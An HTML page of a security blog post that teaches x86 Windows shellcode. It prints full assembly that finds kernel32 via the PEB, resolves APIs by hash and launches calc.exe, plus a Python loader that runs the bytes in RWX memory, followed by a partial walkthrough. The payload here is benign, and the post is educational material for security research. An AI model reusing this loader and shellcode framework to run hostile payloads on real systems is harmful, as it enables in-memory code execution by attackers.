<!DOCTYPE html><html><head><meta charSet="utf-8"/><link rel="icon" href="/favicon.ico"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><title>Mastering x86 Shellcode: A Deep Dive into Calculator-Launching Payload Development<!-- --> | Ivan Spiridonov</title><meta name="description" content="# Mastering x86 Shellcode: A Deep Dive into Calculator-Launching Payload Development

## Introduction

In the realm of cybersecurity, shellcode represents one..."/><meta name="next-head-count" content="8"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><link rel="preload" href="/_next/static/css/9966dcb66c4752d3.css" as="style" crossorigin=""/><link rel="stylesheet" href="/_next/static/css/9966dcb66c4752d3.css" crossorigin="" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" crossorigin="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-fd8027ecb5121007.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/framework-fae63b21a27d6472.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/main-7f705b62e1c5c87e.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/pages/_app-d3437a7a4286203a.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/260-e9b07f57f9f93770.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-4a59e859f401a248.js" defer="" crossorigin=""></script><script src="/_next/static/NHp1Ee1nfm3YUz_wer8uQ/_buildManifest.js" defer="" crossorigin=""></script><script src="/_next/static/NHp1Ee1nfm3YUz_wer8uQ/_ssgManifest.js" defer="" crossorigin=""></script><style data-href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap">@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKxjPg.woff) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8-qxjPg.woff) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8L6tjPg.woff) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v20/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next"><div class="flex flex-col min-h-screen"><nav class="bg-primary/80 backdrop-blur-sm sticky top-0 z-10 shadow-md"><div class="container py-4"><div class="flex items-center justify-between"><div class="flex items-center space-x-6"><a href="/"><span class="text-xl font-bold tracking-tighter bg-gradient-to-r from-accent to-blue-500 bg-clip-text text-transparent">xbz0n</span></a><div class="hidden md:flex space-x-6"><a class="nav-link" href="/">Home</a><a class="nav-link" href="/certifications">Certifications</a><a class="nav-link" href="/cves">CVEs</a><a class="nav-link" href="/blog">Blog</a></div></div><div class="hidden md:flex items-center space-x-4"><a href="mailto:ivanspiridonov@gmail.com" class="text-gray-300 hover:text-accent" aria-label="Email"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path></svg></a><a href="tel:+359876143085" class="text-gray-300 hover:text-accent" aria-label="Phone"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M493.4 24.6l-104-24c-11.3-2.6-22.9 3.3-27.5 13.9l-48 112c-4.2 9.8-1.4 21.3 6.9 28l60.6 49.6c-36 76.7-98.9 140.5-177.2 177.2l-49.6-60.6c-6.8-8.3-18.2-11.1-28-6.9l-112 48C3.9 366.5-2 378.1.6 389.4l24 104C27.1 504.2 36.7 512 48 512c256.1 0 464-207.5 464-464 0-11.2-7.7-20.9-18.6-23.4z"></path></svg></a><a href="https://github.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="GitHub"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://twitter.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="Twitter"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a><span class="text-gray-300 hover:text-accent" aria-label="Location"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 384 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M172.268 501.67C26.97 291.031 0 269.413 0 192 0 85.961 85.961 0 192 0s192 85.961 192 192c0 77.413-26.97 99.031-172.268 309.67-9.535 13.774-29.93 13.773-39.464 0zM192 272c44.183 0 80-35.817 80-80s-35.817-80-80-80-80 35.817-80 80 35.817 80 80 80z"></path></svg></span></div><button class="md:hidden focus:outline-none" aria-label="Toggle menu"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="h-6 w-6 text-gray-300" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg></button></div></div></nav><main class="flex-grow container py-8"><article class="max-w-3xl mx-auto"><a class="text-accent hover:text-accent/80 mb-8 inline-block" href="/blog">← Back to all posts</a><div class="mb-8"><h1 class="text-3xl md:text-4xl font-bold mb-4">Mastering x86 Shellcode: A Deep Dive into Calculator-Launching Payload Development</h1><div class="flex items-center text-sm text-gray-400"><time dateTime="2024-03-18">March 18, 2024</time></div></div><div class="blog-content"><h1>Mastering x86 Shellcode: A Deep Dive into Calculator-Launching Payload Development</h1>
<h2>Introduction</h2>
<p>In the realm of cybersecurity, shellcode represents one of the most fundamental building blocks for both offensive security practitioners and defensive analysts. These compact machine code sequences, traditionally designed to spawn command shells (hence the name), have evolved to perform virtually any programmatic action on a target system.</p>
<p>In this comprehensive analysis, we'll dissect a classic Windows shellcode example that launches the calculator application. While seemingly simple, this example serves as an excellent educational tool, demonstrating critical low-level programming techniques applicable to both security research and software development.</p>
<pre><code>Note: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts.
</code></pre>
<h2>Why Study Shellcode?</h2>
<p>Understanding shellcode construction provides several benefits:</p>
<ol>
<li><strong>Security Research</strong>: Insight into exploitation techniques and vulnerability analysis</li>
<li><strong>Malware Analysis</strong>: Ability to recognize and decode obfuscated malicious code</li>
<li><strong>Low-Level Programming</strong>: Mastery of assembly language and operating system internals</li>
<li><strong>System Architecture</strong>: Deeper understanding of process execution environments</li>
<li><strong>Performance Optimization</strong>: Techniques applicable to high-performance computing</li>
</ol>
<p>The calculator-launching example is particularly valuable because it's benign yet demonstrates all the critical elements found in more sophisticated payloads.</p>
<h2>The Complete Shellcode Implementation</h2>
<p>Below is our complete x86 shellcode implementation with detailed annotations. Each section serves a specific purpose in our goal of launching the Windows calculator application without using standard library functions.</p>
<pre><code class="language-python">import ctypes, struct
from keystone import *

CODE = (
    " start:                             "
    "   mov   ebp, esp                  ;"  # Stack base
    "   add   esp, 0xfffff9f0           ;"  # ~1600 bytes (matches your working one)
    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  # ECX = 0
    "   mov   esi, fs:[ecx+0x30]        ;"  # ESI = PEB
    "   mov   esi, [esi+0x0C]           ;"  # ESI = PEB->Ldr
    "   mov   esi, [esi+0x1C]           ;"  # ESI = InInitOrder
    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  # EBX = module base (kernel32.dll)
    "   mov   edi, [esi+0x20]           ;"  # EDI = module name
    "   mov   esi, [esi]                ;"  # Next module
    "   cmp   [edi+12*2], cx            ;"  # Check for kernel32.dll
    "   jne   next_module               ;"
    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"
    " find_function_ret:                 "
    "   pop esi                         ;"  # ESI = find_function address
    "   mov   [ebp+0x04], esi           ;"  # Store for calls
    "   jmp resolve_symbols_kernel32    ;"
    " find_function_shorten_bnc:         "
    "   call find_function_ret          ;"
    " find_function:                     "
    "   pushad                          ;"
    "   mov   eax, [ebx+0x3c]           ;"
    "   mov   edi, [ebx+eax+0x78]       ;"
    "   add   edi, ebx                  ;"
    "   mov   ecx, [edi+0x18]           ;"
    "   mov   eax, [edi+0x20]           ;"
    "   add   eax, ebx                  ;"
    "   mov   [ebp-4], eax              ;"
    " find_function_loop:                "
    "   jecxz find_function_finished    ;"
    "   dec   ecx                       ;"
    "   mov   eax, [ebp-4]              ;"
    "   mov   esi, [eax+ecx*4]          ;"
    "   add   esi, ebx                  ;"
    " compute_hash:                      "
    "   xor   eax, eax                  ;"
    "   cdq                             ;"
    "   cld                             ;"
    " compute_hash_again:                "
    "   lodsb                           ;"
    "   test  al, al                    ;"
    "   jz    compute_hash_finished     ;"
    "   ror   edx, 0x0d                 ;"
    "   add   edx, eax                  ;"
    "   jmp   compute_hash_again        ;"
    " compute_hash_finished:             "
    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"
    "   jnz   find_function_loop        ;"
    "   mov   edx, [edi+0x24]           ;"
    "   add   edx, ebx                  ;"
    "   mov   cx,  [edx+2*ecx]          ;"
    "   mov   edx, [edi+0x1c]           ;"
    "   add   edx, ebx                  ;"
    "   mov   eax, [edx+4*ecx]          ;"
    "   add   eax, ebx                  ;"
    "   mov   [esp+0x1c], eax           ;"
    " find_function_finished:            "
    "   popad                           ;"
    "   ret                             ;"
    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  # TerminateProcess hash (proven in your working shellcode)
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x10], eax           ;"  # Store TerminateProcess
    "   push  0x16b3fe72                ;"  # CreateProcessA hash
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x18], eax           ;"  # Store CreateProcessA
    " launch_calc:                       "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  # Null terminator
    "   push  0x6578652e                ;"  # ".exe"
    "   push  0x636c6163                ;"  # "calc"
    "   mov   ebx, esp                  ;"  # EBX = "calc.exe"
    " create_startupinfoa:               "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  # hStdError
    "   push  eax                       ;"  # hStdOutput
    "   push  eax                       ;"  # hStdInput
    "   push  eax                       ;"  # lpReserved2
    "   push  eax                       ;"  # cbReserved2 &#x26; wShowWindow
    "   push  eax                       ;"  # dwFlags
    "   push  eax                       ;"  # dwFillAttribute
    "   push  eax                       ;"  # dwYCountChars
    "   push  eax                       ;"  # dwXCountChars
    "   push  eax                       ;"  # dwYSize
    "   push  eax                       ;"  # dwXSize
    "   push  eax                       ;"  # dwY
    "   push  eax                       ;"  # dwX
    "   push  eax                       ;"  # lpTitle
    "   push  eax                       ;"  # lpDesktop
    "   push  eax                       ;"  # lpReserved
    "   mov   al, 0x44                  ;"  # cb = 68
    "   push  eax                       ;"
    "   push  esp                       ;"  # ESI = STARTUPINFOA
    "   pop   esi                       ;"
    " call_createprocessa:               "
    "   mov   eax, esp                  ;"  # Current ESP
    "   xor   ecx, ecx                  ;"
    "   mov   cx, 0x390                 ;"  # 912 bytes
    "   sub   eax, ecx                  ;"  # Adjust ESP safely
    "   push  eax                       ;"  # lpProcessInformation
    "   push  esi                       ;"  # lpStartupInfo
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  # lpCurrentDirectory
    "   push  eax                       ;"  # lpEnvironment
    "   push  eax                       ;"  # dwCreationFlags
    "   inc   eax                       ;"  # EAX = 1
    "   push  eax                       ;"  # bInheritHandles
    "   dec   eax                       ;"  # EAX = 0
    "   push  eax                       ;"  # lpThreadAttributes
    "   push  eax                       ;"  # lpProcessAttributes
    "   push  ebx                       ;"  # lpCommandLine = "calc.exe"
    "   push  eax                       ;"  # lpApplicationName
    "   call  dword ptr [ebp+0x18]      ;"  # CreateProcessA
    " exit_properly:                     "
    "   xor   ecx, ecx                  ;"
    "   push  ecx                       ;"  # uExitCode = 0
    "   push  0xffffffff                ;"  # hProcess = -1 (current process)
    "   call  dword ptr [ebp+0x10]      ;"  # TerminateProcess
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

if not ptr:
    raise Exception("VirtualAlloc failed")

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
</code></pre>
<p>Now, let's analyze this code in depth to understand how each component works.</p>
<h2>The Architecture of Position-Independent Code</h2>
<h3>Stack Setup and Basic Initialization</h3>
<p>The shellcode begins by establishing a stable execution environment:</p>
<pre><code class="language-assembly">mov   ebp, esp                  # Save stack pointer
add   esp, 0xfffff9f0           # Create ~1600 bytes of stack space
</code></pre>
<p>This initial setup creates a stack frame and reserves a significant amount of space (approximately 1600 bytes) for our operations. What's interesting is the use of a negative value (<code>0xFFFFF9F0</code>) to allocate space—a technique employed to avoid NULL bytes in the shellcode, which could terminate string processing in exploits.</p>
<p>The second component is the creation of consistent register states. This is crucial for position-independent code that must function regardless of its memory location:</p>
<pre><code class="language-assembly">xor   ecx, ecx                  # Zero out ECX register
</code></pre>
<p>This simple operation clears ECX without using immediate zero values that would create unwanted NULL bytes in our shellcode.</p>
<h3>Windows Internals: The Process Environment Block</h3>
<p>Next, we navigate Windows internal structures to find Kernel32.dll, the gateway to most Windows API functions:</p>
<pre><code class="language-assembly">mov   esi, fs:[ecx+0x30]        # Access PEB via FS segment register
mov   esi, [esi+0x0C]           # PEB->Ldr (loader data)
mov   esi, [esi+0x1C]           # InInitializationOrderModuleList
</code></pre>
<p>This segment delves into undocumented Windows internals. The FS segment register at offset 0x30 points to the Process Environment Block (PEB), a Windows data structure containing process information. By traversing this structure, we locate the Loader Data Table, which contains information about all loaded modules.</p>
<p>The InInitializationOrderModuleList is particularly useful because Kernel32.dll is typically the second module in this list (ntdll.dll being the first).</p>
<h3>Kernel32.dll Module Discovery</h3>
<p>The next code block iterates through loaded modules to find Kernel32.dll:</p>
<pre><code class="language-assembly">next_module:
mov   ebx, [esi+0x08]           # Store module base address
mov   edi, [esi+0x20]           # Get module name pointer
mov   esi, [esi]                # Move to next module in list
cmp   [edi+12*2], cx            # Check if it's kernel32.dll
jne   next_module               # If not, try next module
</code></pre>
<p>This loop examines each module in the initialization order list. For each module:</p>
<ol>
<li>We grab its base address (stored at offset 0x08)</li>
<li>Retrieve a pointer to its name (offset 0x20)</li>
<li>Move to the next module in the linked list</li>
<li>Check a specific character in the name string (the 13th character, adjusted for Unicode)</li>
</ol>
<p>The comparison at <code>[edi+12*2]</code> is checking for the NULL terminator in "kernel32.dll" (which is 12 characters long). When found, EBX will contain Kernel32.dll's base address—our key to resolving Windows API functions.</p>
<h2>Dynamic Function Resolution: The Heart of Shellcode</h2>
<h3>The JMP/CALL/POP Trick for Self-Referencing</h3>
<p>Position-independent code must know its own location, particularly to access embedded data. The shellcode uses a classic JMP/CALL/POP sequence to achieve this:</p>
<pre><code class="language-assembly">find_function_shorten:
jmp find_function_shorten_bnc   # Jump to the CALL instruction
find_function_ret:
pop esi                         # ESI now has address of find_function
mov [ebp+0x04], esi             # Store for later use
jmp resolve_symbols_kernel32    # Continue execution
find_function_shorten_bnc:
call find_function_ret          # Push return address (find_function)
</code></pre>
<p>This elegant technique:</p>
<ol>
<li>Jumps to a CALL instruction</li>
<li>The CALL pushes the address of the next instruction (find_function) onto the stack</li>
<li>POP retrieves this address into ESI</li>
<li>We store this address for later function resolution calls</li>
</ol>
